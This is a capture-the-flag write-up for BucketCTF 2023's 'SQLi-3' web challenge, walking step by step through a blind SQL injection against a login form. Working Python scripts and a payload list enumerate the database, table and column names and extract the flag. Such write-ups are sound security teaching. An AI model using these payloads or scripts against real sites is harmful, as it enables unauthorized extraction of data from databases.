# SQLi-3 (BucketCTF 2023)

**Challenge category**: Web<br>
**Challenge description**: "Finally! I moved the secret into a COMPLETELY different table. There is NO way you can find it now."<br>
**Challenge points**: 290<br>
**CTF date**: ven, 07 Apr. 2023, 17:00 UTC — dom, 09 Apr. 2023, 17:00 UTC<br>

## Context

This challenge is about a blind SQL injection.


## Exploring the challenge

The web site consists of only one web page.

![Schermata_Iniziale](https://user-images.githubusercontent.com/66698256/230928012-41c691ab-475d-4cad-bf11-d2fb576a5751.png)

The data entered in this form are sent to the <code>/login</code> endpoint.

![Form](https://user-images.githubusercontent.com/66698256/230928060-0684512b-b64a-4923-b597-830479870598.png)

## Attack

We have to inject malicious data inside *Username* field (*Password* field is useless, can bet set to any value). As in the second challenge ([[1]](#1)) semicolons are blocked, but unlike this one queries' outputs are not shown. We can only know if a query ended succesfully or not. For example:

![Injection_Success](https://user-images.githubusercontent.com/66698256/230902891-c0a91a0e-8d02-49f6-b4ea-331e210af2c6.png)

![Success](https://user-images.githubusercontent.com/66698256/230902898-8066778c-14bc-443b-9e43-112030721592.png)

![Injection_Failure](https://user-images.githubusercontent.com/66698256/230902906-0e2549ae-e5b1-4ed7-a734-660696535c1a.png)

![Failure](https://user-images.githubusercontent.com/66698256/230902924-173ea1a0-4f69-41d9-905d-e835cc2d99a5.png)

Thus, the server returns nothing if the query is successful, the string <code>no</code> otherwise. We don't know nothing about the database, the tables inside, their names, their columns and the values stored inside. Despite that, we can rebuild the part of the database of our interest and extrapolate the flag. Let's start.<br>

The piece of code below is to know the length of the database name and the database name. It's not a foundamental step and can be omitted (because we'll use the <code>database()</code> function in the next steps).

```python
import requests



urlname="http://213.133.103.186:6026/login" #http://CONTAINER_IP:CONTAINER_PORT/login

no_string="no"

chars=["{","}","\_","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","!"]#,">","<",":",";","!","@","_","-","+","?","$","#","&","=","*"]
#The underscore character ("_") is represented as "\_" because it is a wildcard in the SQL LIKE operator, so the backslash is useful to make SQL interpret it literally.

len_db_name=1
while True:
        sql_injection="' OR (SELECT LENGTH(database()))="+str(len_db_name)+"#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            break
        len_db_name=len_db_name+1
print ("[Found]The length of the database name is: "+str(len_db_name))

i=0
db_name=""
while i<len_db_name:
    for name_char in chars:
        sql_injection="' OR (SELECT SUBSTRING(database(),"+str(1)+","+str((i+1))+"))='"+str(db_name+name_char)+"'#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            db_name+=name_char
            break
    i=i+1
print ("[Found]The database name is: "+db_name)
```
By injecting <code>' OR CONDITION#</code> within the server query we can ensure that the query returns at least one tuple if and only if <code>CONDITION</code> is true. This is because the truncated condition from the injected input (usually <code>username=''</code>) will surely be false and <code>FALSE OR CONDITION</code> will be true if and only if the second one is true. Therefore, we can know if a condition is true by whether the query succeeds. In the first loop we will find out the length of the database name. In the second we will discover the name of the database, discovering each single character one at a time. Result:

![Len_DB_Name](https://user-images.githubusercontent.com/66698256/230913127-261100a4-9a0c-4e61-abeb-1508ea1738d5.png)


![DB_Name](https://user-images.githubusercontent.com/66698256/230913095-1045f760-f35a-46e2-83e7-c3e379ad8f16.png)


Now we'll find out the number of tables inside the database. So, we'll add the following code to the one above:

```python
tables_count=0
while True:
    sql_injection="' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())="+str(tables_count)+"#"
    print ("[+]Try: "+sql_injection)
    response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
    if no_string not in response.text:
        break
    tables_count=tables_count+1
print ("[Found]The number of tables inside the database is: "+str(tables_count))
```
Let's run it:

![Number_Tables](https://user-images.githubusercontent.com/66698256/230913186-6a38c0f9-5f37-46fd-b708-0c9a0be46f1d.png)


There are two tables. Now we'll find the length of the first table name and the first table name (because the flag is in the first table). Let's add the following code to the ones above:
```python
len_table1_name=1
while True:
        sql_injection="' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)="+str(len_table1_name)+"#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            break
        len_table1_name=len_table1_name+1
print ("[Found]The length of the first table name is: "+str(len_table1_name))


i=0
table1_name=""
while i<len_table1_name:
    for name_char in chars:
        sql_injection="' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '"+str(table1_name+name_char)+"%'#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            table1_name+=name_char
            break
    i=i+1
print ("[Found]The first table name is: "+table1_name) #The first table is 'Flag'!
```
Let's run it:

![Len_Flag_Table_Name](https://user-images.githubusercontent.com/66698256/230913373-524b3ac5-5714-46f2-9560-28c6c894e797.png)

![Flag_Table_Name](https://user-images.githubusercontent.com/66698256/230913407-a9248fc7-f4b9-4fb0-9ba5-9d3d019fe8a2.png)


The first table name is "Flag". Now we'll find out the number of columns inside "Flag" table. Let's add the following code to the ones above:
```python
table1_columns_count=1
while True:
        sql_injection="' OR (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"')="+str(table1_columns_count)+"#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            break
        table1_columns_count=table1_columns_count+1
print ("[Found]The number of columns in the '"+table1_name+"' table is: "+str(table1_columns_count))
```
Let's run it:

![Number_Columns](https://user-images.githubusercontent.com/66698256/230913425-2264d97e-4c3b-4ddb-b0b6-0a90fe8d8dcc.png)


There are two columns. Now we'll find the length of the second column name and second column name (because the flag is in the second column). Let's add the following code to the ones above:
```python
len_column2_name=1
while True:
        sql_injection="' OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"' LIMIT 1,1)="+str(len_column2_name)+"#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            break
        len_column2_name=len_column2_name+1
print ("[Found]The length of the second column name of the '"+table1_name+"' table is: "+str(len_column2_name))

i=0
column2_name=""
while i<len_column2_name:
    for name_char in chars:
        sql_injection="' OR (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+table1_name+"' LIMIT 1,1) LIKE '"+str(column2_name+name_char)+"%'#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            column2_name+=name_char
            break
    i=i+1
print ("[Found]The name of the second column of the '"+table1_name+"' table is: "+column2_name) #Column name: 'value'
```

Let's run it:

![Len_SecCol_Name](https://user-images.githubusercontent.com/66698256/230913461-fd3df1b7-db84-4769-846f-30508eb44db0.png)

![SecCol_Name](https://user-images.githubusercontent.com/66698256/230913487-1df21cd5-194c-4fff-bcc9-7a3b5ba2b215.png)


The second column name is "value". Now let's find the flag length and the flag itself. Let's add the following code to the ones above:
```python
len_flag=1
while True:
        sql_injection="' OR (SELECT LENGTH("+column2_name+") FROM "+table1_name+" LIMIT 0,1)="+str(len_flag)+"#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            break
        len_flag=len_flag+1
print ("[Found]The length of the flag is: "+str(len_flag))

i=0
flag_name=""
flag=""
while i<len_flag:
    for name_char in chars:
        sql_injection="' OR (SELECT "+column2_name+" FROM "+table1_name+" LIMIT 0,1) LIKE '"+str(flag_name+name_char)+"%'#"
        print ("[+]Try: "+sql_injection)
        response=requests.post(urlname,data={'userName':sql_injection,'password':'abcdefg'})    #Random Password
        if no_string not in response.text:
            flag_name+=name_char
            break
    i=i+1

flag=flag_name.replace("\_","_")
print ("[Found]The flag is: "+flag) #Flag
```
Let's run it:

![Len_Flag](https://user-images.githubusercontent.com/66698256/230913551-bf740320-4997-42e2-a7fe-7ed0796ca9e9.png)

![Flag](https://user-images.githubusercontent.com/66698256/230913577-72c2c974-6b60-4551-b961-06cddf2ace65.png)


Flag is <code>bucket{j01n5_m4k3_n0_53n53_a5ed15}</code>.

## Payloads

Here is a summary of all the payloads used in the various phases of the attack. These should be used in loops with different values (as shown in the codes above).

+ <code>' OR (SELECT LENGTH(database()))=numeric_value#</code> for the length of the database name;<br>
+ <code>' OR (SELECT SUBSTRING(database(),1,numeric_value))='substring'#</code> for database name;<br>
+ <code>' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=numeric_value#</code> for the tables count in the database;<br>
+ <code>' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=numeric_value#</code> for the length of the first table name;<br>
+ <code>' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'substring%'#</code> for the first table name;<br>
+ <code>' OR (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name')=numeric_value#</code> for the columns count in the first table;<br>
+ <code>' OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1)=numeric_value#</code> for the length of the second column name of the first table;<br>
+ <code>' OR (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1) LIKE 'substring%'#</code> for the second column name of the first table;<br>
+ <code>' OR (SELECT LENGTH(second_column_name) FROM first_table_name LIMIT 0,1)=numeric_value#</code> for the length of the flag;<br>
+ <code>' OR (SELECT second_column_name FROM first_table_name LIMIT 0,1) LIKE 'substring%'#</code> for the flag.<br>

## References
<a id="1">[1]</a> 
https://github.com/H31s3n-b3rg/BucketCTF_2023/blob/main/SQLi/SQLi-2/README.md
